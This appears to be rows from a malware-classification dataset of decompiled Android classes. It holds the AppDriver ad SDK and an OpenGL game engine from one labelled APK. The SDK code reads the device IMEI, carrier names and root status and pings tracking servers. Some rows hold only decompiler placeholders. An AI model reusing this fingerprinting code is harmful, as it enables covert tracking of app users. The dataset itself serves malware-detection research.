"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.adways.appdriver.sdk.compress\d.code","public final class d extends AsyncTask {   private AppDriverPromotionLayout a;   public d(  AppDriverPromotionLayout appDriverPromotionLayout){     this.a=appDriverPromotionLayout;   }   @Override protected final Object doInBackground(  Object... objArr){     boolean m3a;     AppDriverPromotionLayout appDriverPromotionLayout=this.a;     m3a=AppDriverPromotionLayout.m3a();     return Boolean.valueOf(m3a);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.adways.appdriver.sdk.compress\e.code","public final class e extends AsyncTask {   private AppDriverPromotionOption a;   public e(  AppDriverPromotionOption appDriverPromotionOption){     this.a=appDriverPromotionOption;   }   @Override protected final Object doInBackground(  Object... objArr){     Integer a;     a=this.a.a();     return a;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.adways.appdriver.sdk.compress\f.code","public final class f {   public static Context f13a;   static String e;   private static String h;   public static int a=0;   public static String f15a="""";   static String f18b="""";   static String c="""";   private static String g=null;   public static String d="""";   static int b=0;   static String f=null;   public static boolean f16a=false;   static Boolean f14a=null;   private static Boolean f17b=false;   public static String a(){     if (h == null) {       h=b();     }     return h;   }   private static void m5a(){     String str;     String str2=null;     try {       XmlResourceParser openXmlResourceParser=f13a.createPackageContext(f13a.getPackageName(),0).getAssets().openXmlResourceParser(""AndroidManifest.xml"");       openXmlResourceParser.getEventType();       str=null;       while (true) {         try {           int next=openXmlResourceParser.next();           if (next == 1) {             break;           }           if (next == 2 && ""data"".equals(openXmlResourceParser.getName())) {             for (int i=0; i < openXmlResourceParser.getAttributeCount(); i++) {               if (openXmlResourceParser.getAttributeName(i).equals(""scheme"")) {                 str=openXmlResourceParser.getAttributeValue(i);               }  else               if (openXmlResourceParser.getAttributeName(i).equals(""host"")) {                 str2=openXmlResourceParser.getAttributeValue(i);               }               l.b(""attr"",openXmlResourceParser.getAttributeName(i));               l.b(""attr"",openXmlResourceParser.getAttributeValue(i));             }           }         }  catch (        PackageManager.NameNotFoundException e2) {         } catch (        IOException e3) {         } catch (        XmlPullParserException e4) {         }       }     }  catch (    PackageManager.NameNotFoundException e5) {       str=null;     } catch (    IOException e6) {       str=null;     } catch (    XmlPullParserException e7) {       str=null;     }     if (str == null) {       return;     }     if (str2 == null) {       str2=""undefined"";     }     f=str + ""://"" + str2+ ""/"";   }   public static void a(  int i,  String str){     b=i;     f=str;   }   public static void a(  int i,  String str,  Context context){     a=i;     f15a=str;     f13a=context;     try {       PackageInfo packageInfo=f13a.getPackageManager().getPackageInfo(f13a.getPackageName(),128);       if (packageInfo.versionName != null) {         d=packageInfo.versionName + ""-"" + packageInfo.versionCode;       }  else {         d=""not defined"";       }     }  catch (    PackageManager.NameNotFoundException e2) {     } catch (    NullPointerException e3) {     }     TelephonyManager telephonyManager=(TelephonyManager)f13a.getSystemService(""phone"");     f18b=l.b(telephonyManager.getNetworkOperatorName());     c=l.b(telephonyManager.getSimOperatorName());     if (new File(""/system/bin/su"").exists()) {       f16a=true;     }     if (f == null) {       m5a();     }   }   public static void a(  Boolean bool){     l.a(bool);   }   public static void a(  String str){     if (str == null) {       e=l.d();     }  else {       h=str;       e=str;     }   }   public static boolean m6a(){     return f17b.booleanValue();   }   public static String b(){     if (g == null) {       String b2=l.b(((TelephonyManager)f13a.getSystemService(""phone"")).getDeviceId());       if (!b2.equals("""")) {         b2=l.m13a(b2);       }       g=b2;     }     return g;   }   public static void b(  Boolean bool){     l.b(bool);   }   public static void c(  Boolean bool){     f17b=bool;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.adways.appdriver.sdk.compress\g.code","!org.eclipse.jdt.core.dom.TypeDeclaration@2022215e"
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.adways.appdriver.sdk.compress\h.code","final class h implements FilenameFilter {   public h(  g gVar){   }   @Override public final boolean accept(  File file,  String str){     return str.matches(""appdriver_.*incomplete_data"");   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.adways.appdriver.sdk.compress\i.code","final class i implements Comparator {   public i(  g gVar){   }   private static int a(  File file,  File file2){     try {       JSONObject jSONObject=new JSONObject(l.c(file.getName()));       JSONObject jSONObject2=new JSONObject(l.c(file2.getName()));       if (jSONObject.getInt(""timestamp"") > jSONObject2.getInt(""timestamp"")) {         return 1;       }       return jSONObject.getInt(""timestamp"") < jSONObject2.getInt(""timestamp"") ? -1 : 0;     }  catch (    NullPointerException e) {       return 0;     } catch (    JSONException e2) {       return 0;     }   }   @Override public final int compare(  Object obj,  Object obj2){     return a((File)obj,(File)obj2);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.adways.appdriver.sdk.compress\j.code","public final class j implements Runnable {   private final Intent a;   private g f26a;   public j(  g gVar,  Intent intent){     this.f26a=gVar;     this.a=intent;   }   @Override public final void run(){     Context context;     context=this.f26a.f20a;     context.startActivity(this.a);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.adways.appdriver.sdk.compress\k.code","!org.eclipse.jdt.core.dom.TypeDeclaration@3ddd688e"
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.adways.appdriver.sdk.compress\l.code","public final class l {   private static Boolean a=false;   private static Boolean b=false;   public static FilenameFilter a(  String str){     return new m(str);   }   public static String a(){     return b.booleanValue() ? ""http://192.168.50.38/"" : a.booleanValue() ? ""http://sandbox.appdriver.jp/"" : ""http://appdriver.jp/"";   }   public static String a(  Activity activity){     return activity.getResources().getConfiguration().orientation == 2 ? AppDriverFactory.LANDSCAPE : AppDriverFactory.PORTRAIT;   }   public static String m13a(  String str){     MessageDigest messageDigest=null;     try {       messageDigest=MessageDigest.getInstance(""SHA-256"");     }  catch (    NoSuchAlgorithmException e) {       a(""AppDriverUtil"",""sha256ToHexString"",e);     }     StringBuilder sb=new StringBuilder();     messageDigest.update(str.getBytes());     byte[] digest=messageDigest.digest();     for (    byte b2 : digest) {       String hexString=Integer.toHexString(b2 & 255);       if (hexString.length() == 1) {         sb.append(""0"");       }       sb.append(hexString);     }     return sb.toString();   }   public static String a(  Date date){     return m14a().format(date);   }   public static String a(  SortedMap sortedMap,  String str){     StringBuilder sb=new StringBuilder();     StringBuilder sb2=new StringBuilder();     for (    String str2 : sortedMap.keySet()) {       sb.append(str2);       sb.append(""="");       try {         sb.append(URLEncoder.encode((String)sortedMap.get(str2),""UTF-8""));       }  catch (      UnsupportedEncodingException e) {         a(""AppDriverUtil"",""makeSignedParamString"",e);       }       sb.append(""&"");       sb2.append((String)sortedMap.get(str2));       sb2.append("";"");     }     sb2.append(str);     return String.valueOf(sb.toString()) + ""digest="" + m13a(sb2.toString());   }   private static StringBuilder a(  String... strArr){     StringBuilder sb=new StringBuilder();     for (    String str : strArr) {       sb.append(str);     }     return sb;   }   private static DateFormat m14a(){     SimpleDateFormat simpleDateFormat=new SimpleDateFormat(""yyyy-MM-dd'T'HH:mm:ss"");     simpleDateFormat.setTimeZone(TimeZone.getTimeZone(""JST""));     return simpleDateFormat;   }   public static Date m15a(  String str){     try {       return m14a().parse(str);     }  catch (    ParseException e) {       a(""AppDriverUtil"",""convertStringToDate"",e);       return null;     }   }   public static void a(  Activity activity,  String str){     if (AppDriverFactory.LANDSCAPE.equals(str)) {       activity.setRequestedOrientation(0);     }  else {       activity.setRequestedOrientation(1);     }   }   public static void a(  Boolean bool){     a=bool;   }   public static void a(  String str,  String str2){     if (b.booleanValue()) {       Log.i(str,str2);     }   }   public static void a(  String str,  String str2,  Throwable th){     if (a.booleanValue()) {       Log.e(str,String.valueOf(str2) + "": "" + th.toString());     }   }   public static boolean m16a(){     ConnectivityManager connectivityManager=(ConnectivityManager)f.f13a.getSystemService(""connectivity"");     if (connectivityManager.getActiveNetworkInfo() != null) {       return connectivityManager.getActiveNetworkInfo().isConnected();     }     return false;   }   public static boolean m17a(  String str){     return f.f13a.getFileStreamPath(str).exists();   }   public static String b(){     return b.booleanValue() ? ""http://192.168.50.38:3009/"" : a.booleanValue() ? """" : ""http://gyro.appdriver.jp/"";   }   public static String b(  String str){     return str == null ? """" : str;   }   public static void b(  Boolean bool){     b=bool;   }   public static void b(  String str,  String str2){     if (a.booleanValue()) {       Log.i(str,str2);     }   }   public static boolean m18b(){     String str=Build.VERSION.RELEASE;     b(""AppDriverUtil"",""OS version : "" + str);     return (!str.equals(""1.6"")) && f.f13a != null && m19c();   }   public static String c(){     return UUID.randomUUID().toString();   }   public static String c(  String str){     b(""AppDriverUtil"",str);     StringBuilder sb=new StringBuilder();     try {       FileInputStream openFileInput=f.f13a.openFileInput(str);       InputStreamReader inputStreamReader=new InputStreamReader(openFileInput,""UTF-8"");       BufferedReader bufferedReader=new BufferedReader(inputStreamReader);       while (true) {         String readLine=bufferedReader.readLine();         if (readLine == null) {           bufferedReader.close();           inputStreamReader.close();           openFileInput.close();           return sb.toString();         }         sb.append(readLine);       }     }  catch (    FileNotFoundException|IOException|NullPointerException e) {       return null;     }   }   public static void c(  String str,  String str2){     if (a.booleanValue()) {       Log.e(str,str2);     }   }   private static boolean m19c(){     int statusCode;     if (f.f14a != null) {       return f.f14a.booleanValue();     }     String sb=a(""appdriver_"",""stop_sdk"").toString();     String c=c(sb);     if (c != null && c.equals(f.d)) {       Boolean bool=false;       f.f14a=bool;       return bool.booleanValue();     }     DefaultHttpClient defaultHttpClient=new DefaultHttpClient();     HttpParams params=defaultHttpClient.getParams();     HttpConnectionParams.setConnectionTimeout(params,5000);     HttpConnectionParams.setSoTimeout(params,5000);     TreeMap treeMap=new TreeMap();     treeMap.put(""app"",f.d);     StringBuilder a2=a(a(),""3"",""."",""0"",""."",String.valueOf(f.a),""z"");     String a3=a(treeMap,f.f15a);     a2.append(""?"");     a2.append(a3);     try {       statusCode=defaultHttpClient.execute(new HttpGet(a2.toString())).getStatusLine().getStatusCode();     }  catch (    ClientProtocolException e) {       a(""AppDriverUtil"",""ClientProtocolException"",e);     } catch (    IOException e2) {       a(""AppDriverUtil"",""IOException"",e2);     }     if (statusCode == 401) {       f.f14a=false;       d(sb,f.d);       b(""AppDriverUtil"",""ping response is 401"");       return false;     }     if (statusCode == 200) {       b(""AppDriverUtil"",""ping response is 200"");       f.f14a=true;     }  else {       b(""AppDriverUtil"",""ping response is not 401 or 200. It's "" + statusCode);     }     return true;   }   public static String d(){     String c=c(""appdriver_uuid"");     if (c != null) {       return c;     }     String uuid=UUID.randomUUID().toString();     d(""appdriver_uuid"",uuid);     return uuid;   }   public static void d(  String str,  String str2){     try {       FileOutputStream openFileOutput=f.f13a.openFileOutput(str,0);       PrintWriter printWriter=new PrintWriter(new OutputStreamWriter(openFileOutput,""UTF-8""));       printWriter.append((CharSequence)str2);       printWriter.close();       openFileOutput.close();     }  catch (    FileNotFoundException e) {     } catch (    UnsupportedEncodingException e2) {     } catch (    IOException e3) {     } catch (    NullPointerException e4) {     }   }   public static String e(){     return b.booleanValue() ? ""development"" : a.booleanValue() ? ""sandbox"" : ""production"";   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.adways.appdriver.sdk.compress\m.code","final class m implements FilenameFilter {   private final String a;   public m(  String str){     this.a=str;   }   @Override public final boolean accept(  File file,  String str){     return str.matches(this.a);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.adways.appdriver.sdk.unity\AppDriverTrackerforUnity.code","public final class AppDriverTrackerforUnity {   public static void actionComplete(  Context context,  String str){     new g(context,new Handler(Looper.getMainLooper()),str).start();   }   public static void childActionComplete(  String str){     AppDriverTracker.childActionComplete(str);   }   public static void childActionComplete(  String str,  String str2){     AppDriverTracker.childActionComplete(str,str2);   }   public static void paymentComplete(  String str,  String str2,  float f,  int i,  String str3){     AppDriverTracker.paymentComplete(str,str2,f,i,str3);   }   public static void requestAppDriver(  Context context,  int i,  String str){     AppDriverTracker.setUnityFlag(true);     AppDriverTracker.requestAppDriver(context,i,str);   }   public static void requestAppDriver(  Context context,  int i,  String str,  int i2){     AppDriverTracker.setUnityFlag(true);     AppDriverTracker.requestAppDriver(context,i,str,i2);   }   public static void requestAppDriver(  Context context,  int i,  String str,  int i2,  String str2){     AppDriverTracker.setUnityFlag(true);     AppDriverTracker.requestAppDriver(context,i,str,i2,str2);   }   public static void setDevMode(  boolean z){     AppDriverTracker.setDevMode(z);   }   public static void setRefresh(  int i,  String str){     AppDriverTracker.setRefresh(i,str);   }   public static void setTestMode(  boolean z){     AppDriverTracker.setTestMode(z);   }   public static void setVerboseMode(  boolean z){     AppDriverTracker.setVerboseMode(z);   }   public static void targetCancel(  String str){     AppDriverTracker.targetCancel(str);   }   public static void targetComplete(  String str){     AppDriverTracker.targetComplete(str);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.tools\Dialog.code","public class Dialog {   public String[] lines={"""","""","""","""",""""};   public String positive="""";   public String negative="""";   public int positiveState=0;   public int negativeState=0;   public Dialog setMessage(  String string){     int j=0;     int l=0;     for (int i=0; i < string.length(); i++) {       char c=string.charAt(i);       if (c != '\n') {         String[] strArr=this.lines;         strArr[l]=String.valueOf(strArr[l]) + c;         j++;         if (j > 32 && c == ' ') {           j=0;           l++;         }       }  else {         j=0;         l++;       }     }     return this;   }   public Dialog setPositiveButton(  String string,  int state){     this.positiveState=state;     this.positive=string;     return this;   }   public Dialog setNegativeButton(  String string,  int state){     this.negativeState=state;     this.negative=string;     return this;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.tools\ObjReader.code","public class ObjReader {   InputStream is;   boolean mtlincluded;   boolean wireFrame=false;   int mtlnum=-1;   public ArrayList vertices=new ArrayList();   public ArrayList normals=new ArrayList();   public ArrayList textures=new ArrayList();   ArrayList mtlinfo=new ArrayList();   public ArrayList polygons=new ArrayList();   public ObjReader(  InputStream is,  boolean mtlexists){     this.mtlincluded=false;     this.is=is;     this.mtlincluded=mtlexists;   }   String[] splitTokens(  String newLine,  String token){     return newLine.split(token);   }   public void readFile(){     try {       InputStreamReader in=new InputStreamReader(this.is);       BufferedReader input=new BufferedReader(in);       while (true) {         String newLine=input.readLine();         if (newLine != null) {           String newLine2=newLine.replaceAll(""  "","" "");           int ind=newLine2.indexOf(""vn "");           if (ind != -1) {             readNormal(newLine2);           }  else {             int ind2=newLine2.indexOf(""v "");             if (ind2 != -1) {               readVertex(newLine2);             }  else {               int ind3=newLine2.indexOf(""f "");               if (ind3 == 0) {                 readPolygon(newLine2);               }  else {                 int ind4=newLine2.indexOf(""vt "");                 if (ind4 != -1) {                   readTexture(newLine2);                 }               }             }           }         }  else {           input.close();           return;         }       }     }  catch (    IOException ex) {       ex.printStackTrace();     }   }   void readVertex(  String newLine){     String[] pieces=newLine.split("" "");     Point3 vert=new Point3(Double.parseDouble(pieces[1]),Double.parseDouble(pieces[2]),Double.parseDouble(pieces[3]));     this.vertices.add(vert);   }   void readNormal(  String newLine){     String[] pieces=newLine.split("" "");     Point3 norms=new Point3(Double.parseDouble(pieces[1]),Double.parseDouble(pieces[2]),Double.parseDouble(pieces[3]));     this.normals.add(norms);   }   void readTexture(  String newLine){     String[] pieces=newLine.split("" "");     Point3 tex=new Point3(Double.parseDouble(pieces[1]),Double.parseDouble(pieces[2]),0.0d);     this.textures.add(tex);   }   void readPolygon(  String newLine){     String[] pieces=newLine.split("" "");     for (int i=1; i < pieces.length; i++) {       String[] smallerPieces=splitTokens(pieces[i],""/"");       this.polygons.add(Integer.valueOf(Integer.parseInt(smallerPieces[0])));     }   }   void readMTLInfo(  String newLine){     newLine.split("" "");     int mtlsize=this.mtlinfo.size();     for (int i=0; i < mtlsize && 0 == 0; i++) {     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.tools\Osaris2D3D.code","public abstract class Osaris2D3D extends Renderer {   private static final int VERTS=4;   public static float delta;   public static float height;   private static IntBuffer mTexBuffer;   public static SpriteManager sprites;   public static float width;   private Sprite[] mNumbers;   public static int perspectiveFOV=90;   public static int perspectiveMax=150;   public static float perspectiveMin=0.25f;   public static float width2D=800.0f;   public static float height2D=480.0f;   public static long[] lastDone=new long[32];   public static boolean LOW_END_DEVICE=false;   public static int lfps=0;   public static int fps=0;   public static long time=System.currentTimeMillis();   public static long timec=System.currentTimeMillis();   public static int minute=0;   public static int second=0;   public static long milli=0;   public static int minFT=1000;   public static int maxFT=0;   private static boolean animation=false;   public static long tps=0;   public static long globalTime=0;   public static boolean mustDo(  int id,  long milliBeforeDoingAgain){     long now=System.currentTimeMillis();     if (now <= lastDone[id] + milliBeforeDoingAgain) {       return false;     }     lastDone[id]=now;     return true;   }   @Override public void surfaceCreated(){     for (int i=0; i < 32; i++) {       lastDone[i]=0;     }     GLES10.glDisable(3024);     GLES10.glHint(3152,4353);     GLES10.glClearColor(0.0f,0.0f,0.0f,0.0f);     GLES10.glEnable(2884);     GLES10.glShadeModel(7425);     GLES10.glDisable(2929);     GLES10.glDepthFunc(515);     GLES10.glEnable(3553);     sprites=new SpriteManager();     ByteBuffer tbb=ByteBuffer.allocateDirect(32);     tbb.order(ByteOrder.nativeOrder());     mTexBuffer=tbb.asIntBuffer();     mTexBuffer.put(0);     mTexBuffer.put(0);     mTexBuffer.put(0);     mTexBuffer.put(65536);     mTexBuffer.put(65536);     mTexBuffer.put(0);     mTexBuffer.put(65536);     mTexBuffer.put(65536);     mTexBuffer.position(0);     float[] fogColor={0.6392157f,0.7411765f,0.9098039f,0.0f};     GLES10.glFogfv(2918,fogColor,0);     GLES10.glEnable(3042);     GLES10.glBlendFunc(770,771);     if (!LOW_END_DEVICE) {       GLES10.glEnable(2912);     }     GLES10.glFogf(2915,10.0f);     if (!JumpyBall.PC) {       GLES10.glFogx(2917,2049);     }     GLES10.glFogf(2914,0.015f);     GLES10.glHint(3156,4352);     GLES10.glEnableClientState(32884);     GLES10.glEnableClientState(32888);   }   public void setMatrix2D(){     GLES10.glLoadIdentity();     GLES10.glMatrixMode(5889);     GLES10.glLoadIdentity();     gluOrtho2D(0.0f,width2D,height2D,0.0f);     GLES10.glMatrixMode(5888);     GLES10.glFrontFace(2305);     GLES10.glEnable(3553);     GLES10.glTexCoordPointer(2,5132,0,mTexBuffer);     GLES10.glEnable(3042);     GLES10.glBlendFunc(770,771);     GLES10.glDisable(2912);   }   private static void gluOrtho2D(  float left,  float right,  float bottom,  float top){     GLES10.glOrthof(left,right,bottom,top,-1.0f,1.0f);   }   public void setMatrix3D(){     GLES10.glLoadIdentity();     float ratio=width / height;     GLES10.glMatrixMode(5889);     GLES10.glLoadIdentity();     gluPerspective(perspectiveFOV,ratio,perspectiveMin,perspectiveMax);     GLES10.glMatrixMode(5888);     if (!LOW_END_DEVICE) {       GLES10.glEnable(2912);     }   }   private static void gluPerspective(  float fovy,  float aspect,  float zNear,  float zFar){     float top=zNear * ((float)Math.tan(fovy * 0.008726646259971648d));     float bottom=-top;     float left=bottom * aspect;     float right=top * aspect;     GLES10.glFrustumf(left,right,bottom,top,zNear,zFar);   }   public void initGL(){     GLES10.glDisable(2896);     GLES10.glClear(16640);   }   @Override public void sizeChanged(  int width2,  int height2){     GLES10.glViewport(0,0,width2,height2);     width=width2;     height=height2;     float ratio=width2 / height2;     GLES10.glMatrixMode(5889);     GLES10.glLoadIdentity();     GLES10.glFrustumf(-ratio,ratio,-1.0f,1.0f,1.0f,150.0f);     System.out.println(""res "" + width2 + "" ""+ height2);   }   public void time(){     tps=System.currentTimeMillis() - timec;     if (tps > 100) {       tps=100L;     }     if (tps < 0) {       tps=0L;     }     delta=((float)Math.min(tps,100L)) / 100.0f;     globalTime+=tps;     timec=System.currentTimeMillis();     if (timec - time > 1000) {       time-=1000;       if (timec - time > 1000) {         time=timec;       }       lfps=fps;       fps=0;       int i=minute;       int i2=second + 1;       second=i2;       minute=(i2 >= 60 ? 1 : 0) + i;       second%=60;       minFT=1000;       maxFT=0;     }     fps++;     milli=timec - time;     minFT=(int)Math.min(minFT,tps);     maxFT=(int)Math.max(maxFT,tps);     if (animation) {       sprites.animStep(delta);     }   }   public void drawTime(  int minute2,  int second2,  int x,  int y){     GLES10.glTranslatef(x,y,0.0f);     this.mNumbers[(minute2 - (minute2 % 10)) / 10].draw();     GLES10.glTranslatef(23.0f,0.0f,0.0f);     this.mNumbers[minute2 % 10].draw();     GLES10.glTranslatef(17.0f,0.0f,0.0f);     this.mNumbers[10].draw();     GLES10.glTranslatef(15.0f,0.0f,0.0f);     this.mNumbers[(second2 - (second2 % 10)) / 10].draw();     GLES10.glTranslatef(23.0f,0.0f,0.0f);     this.mNumbers[second2 % 10].draw();     GLES10.glTranslatef((((-x) - 46) - 15) - 17,-y,0.0f);   }   public void drawNb(  int nb,  int nbDigits,  int x,  int y){     GLES10.glTranslatef((nbDigits * 23) + x,y,0.0f);     for (int i=0; i < nbDigits; i++) {       GLES10.glTranslatef(-23.0f,0.0f,0.0f);       this.mNumbers[nb % 10].draw();       nb/=10;     }     GLES10.glTranslatef(-x,-y,0.0f);   }   public void drawNb(  int nb,  int nbDigits,  int x,  int y,  int fontSize,  int color,  int align){     int largeur=(fontSize * 5) / 5;     for (int i=0; i < nbDigits; i++) {       Text.drawNb(nb % 10,(x - (largeur * i)) - (((((nbDigits * align) / 2) - nbDigits) + 1) * largeur),y,fontSize,color);       nb/=10;     }   }   public void drawTime(  int min,  int sec,  int dixieme,  int x,  int y,  int fontSize,  int color,  int align,  int mode){     int largeur=((fontSize * 5) / 5) + 1;     int dl=(int)(fontSize * 0.35d);     int dec=(((largeur * 3) + dl) * align) / 2;     int start=0;     int dixsec=((sec - (sec % 10)) / 10) % 10;     if (mode == 1) {       dec=(((largeur * 4) + (dl * 2)) * align) / 2;       Text.drawNb(min % 10,x - dec,y,fontSize,color);       Text.draw(""."",(((x - dec) + largeur) + (dl / 3)) - 3,((fontSize / 4) + y) - 2,fontSize,color);       Text.draw(""."",(((x - dec) + largeur) + (dl / 3)) - 3,((y + fontSize) - (fontSize / 4)) - 2,fontSize,color);       start=largeur + dl;     }  else     if (mode == 2 || mode == 3) {       dec=((((dixsec > 0 ? 4 : 3) * largeur) + dl) * align) / 2;       if (mode == 2) {         Text.draw(""+"",x - dec,y + 4,fontSize - 4,color);       }       if (mode == 3) {         Text.draw(""-"",x - dec,y + 16,fontSize,color);       }       if (dixsec > 0) {         start=(largeur * 3) / 4;       }     }     if (dixsec > 0 || mode < 2) {       Text.drawNb(dixsec,(x + start) - dec,y,fontSize,color);     }     Text.drawNb(sec % 10,((x + start) - dec) + largeur,y,fontSize,color);     Text.draw(""."",((((x + start) - dec) + (largeur * 2)) + (dl / 3)) - 3,((y + fontSize) - (fontSize / 4)) - 2,fontSize,color);     Text.drawNb(dixieme % 10,((x + start) - dec) + (largeur * 2) + dl,y,fontSize,color);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.tools\OsarisTools.code","public class OsarisTools {   public static final String PREFS_NAME=""OsarisSettings"";   public static Activity activity;   private static SharedPreferences.Editor editor;   private static SharedPreferences settings;   private static Vibrator vibrator;   static long lastVib=0;   public static boolean vibrate=true;   public static boolean getBooleanValue(  String str,  boolean def){     return settings.getBoolean(str,def);   }   public static int getIntValue(  String str,  int def){     return settings.getInt(str,def);   }   public static String getStringValue(  String str,  String def){     return settings.getString(str,def);   }   public static void setValue(  String str,  boolean val){     editor.putBoolean(str,val);     editor.commit();   }   public static void setValue(  String str,  int val){     editor.putInt(str,val);     editor.commit();   }   public static void setValue(  String str,  String val){     editor.putString(str,val);     editor.commit();   }   public static void init(  Activity act){     activity=act;     settings=activity.getPreferences(0);     editor=settings.edit();     Tracks.nbUnlocked=Math.min(Math.max(getIntValue(""unlockedtracks"",1),1),Tracks.nbLvls);     Tracks.nbShipUnlocked=Math.min(Math.max(getIntValue(""unlockedships"",1),1),5);     if (JumpyBall.essai) {       Tracks.nbShipUnlocked=2;     }     Tracks.nbTrackUnlocked=Math.min(Math.max(getIntValue(""unlockedsolotracks"",1),1),Tracks.nbTracks);     if (JumpyBall.dev) {       Tracks.nbUnlocked=Tracks.nbLvls;       Tracks.nbShipUnlocked=5;       Tracks.nbTrackUnlocked=Tracks.nbTracks;     }     RokonMusic.musicOn=getBooleanValue(""musicOn"",true);     RokonAudio.mute=!getBooleanValue(""soundOn"",true);     Osaris2D3D.LOW_END_DEVICE=getBooleanValue(""lowEnd"",false);     vibrate=getBooleanValue(""vibrate"",true);     InGame.controlMode=JumpyBall.KEYONLY ? 2 : getIntValue(""controlMode2"",0);     InGame.cockpitView=getBooleanValue(""cockpitView"",InGame.cockpitView);   }   public static void exit(){     exit(5000L);   }   public static void exit(  long time){     activity.finish();   }   public static void vibrate(){     if (!InGame.finished && !InGame.gameOver) {       if (Osaris2D3D.mustDo(6,1000L)) {         InGame.blam.play(1.0f);       }       InGame.effblam=1.0f;       InGame.effblamx=0.0f;       InGame.effblamy=0.0f;       if (vibrate) {         if (vibrator == null) {           vibrator=(Vibrator)activity.getSystemService(""vibrator"");         }         if (System.currentTimeMillis() > lastVib + 1000) {           vibrator.vibrate(50L);           lastVib=System.currentTimeMillis();         }       }     }   }   public static Bitmap openBitmap(  String file){     BitmapFactory.Options opts=new BitmapFactory.Options();     opts.inJustDecodeBounds=false;     opts.inDither=true;     InputStream is=openAsset(""pics/"" + file);     Bitmap bitmap=BitmapFactory.decodeStream(is,null,opts);     return bitmap.copy(Bitmap.Config.ARGB_8888,false);   }   public static InputStream openAsset(  String file){     try {       InputStream is=activity.getAssets().open(file);       return is;     }  catch (    IOException e) {       System.out.println(""File not found : "" + file);       throw new NullPointerException(""File not found : "" + file);     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.tools\Point3.code","public class Point3 {   public static final Point3 tmp=new Point3(0.0d,0.0d,0.0d);   public static final Point3 tmp2=new Point3(0.0d,0.0d,0.0d);   public double x;   public double y;   public double z;   public Point3(  double x,  double y,  double z){     this.x=x;     this.y=y;     this.z=z;   }   public void set(  Point3 other){     this.x=other.x;     this.y=other.y;     this.z=other.z;   }   public void set(  double x,  double y,  double z){     this.x=x;     this.y=y;     this.z=z;   }   public double distance(){     return Math.sqrt(sqaredDistance());   }   public double distance(  Point3 other){     return Math.sqrt(sqaredDistance(other));   }   public double sqaredDistance(){     return (this.x * this.x) + (this.y * this.y) + (this.z * this.z);   }   public double sqaredDistance(  Point3 other){     return ((other.x - this.x) * (other.x - this.x)) + ((other.y - this.y) * (other.y - this.y)) + ((other.z - this.z) * (other.z - this.z));   }   public void translate(  Vector3 other){     this.x+=other.x;     this.y+=other.y;     this.z+=other.z;   }   public void translate(  Vector3 other,  double mult){     this.x+=other.x * mult;     this.y+=other.y * mult;     this.z+=other.z * mult;   }   public Point3 plus(  Vector3 other,  Point3 result){     result.set(this.x + other.x,this.y + other.y,this.z + other.z);     return result;   }   public Point3 minus(  Vector3 other,  Point3 result){     result.set(this.x - other.x,this.y - other.y,this.z - other.z);     return result;   }   public Point3 plus(  Vector3 other,  double mult,  Point3 result){     result.set(this.x + (other.x * mult),this.y + (other.y * mult),this.z + (other.z * mult));     return result;   }   public void putIn3(  int[] points,  int index){     points[index * 3]=(int)this.x;     points[(index * 3) + 1]=(int)this.y;     points[(index * 3) + 2]=(int)this.z;   }   public void putIn5(  int[] points,  int index){     points[index * 5]=(int)this.x;     points[(index * 5) + 1]=(int)this.y;     points[(index * 5) + 2]=(int)this.z;   }   public String toString(){     return ""["" + ((int)this.x) + "" ""+ ((int)this.y)+ "" ""+ ((int)this.z)+ ""]"";   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.tools\TextureUtil.code","public class TextureUtil {   public static void loadTexture(  int id,  String file,  boolean filter){     GLES10.glBindTexture(3553,id);     GLES10.glTexParameterf(3553,10241,9728.0f);     if (!Osaris2D3D.LOW_END_DEVICE && filter) {       GLES10.glTexParameterf(3553,10240,9729.0f);       GLES10.glTexParameterf(3553,10241,9729.0f);     }  else {       GLES10.glTexParameterf(3553,10240,9729.0f);     }     GLES10.glTexParameterf(3553,10242,33071.0f);     GLES10.glTexParameterf(3553,10243,33071.0f);     GLES10.glTexEnvf(8960,8704,8448.0f);     Bitmap bitmap=OsarisTools.openBitmap(file);     if (Osaris2D3D.LOW_END_DEVICE) {       bitmap=Bitmap.createScaledBitmap(bitmap,bitmap.getWidth() / 2,bitmap.getHeight() / 2,true);     }     GLUtils.texImage2D(3553,0,bitmap,0);     bitmap.recycle();   }   public static int loadTexture(  String file,  boolean filter){     int[] textures=new int[1];     GLES10.glGenTextures(1,textures,0);     loadTexture(textures[0],file,filter);     return textures[0];   }   public static int loadTexture(  String file){     return loadTexture(file,true);   } } "
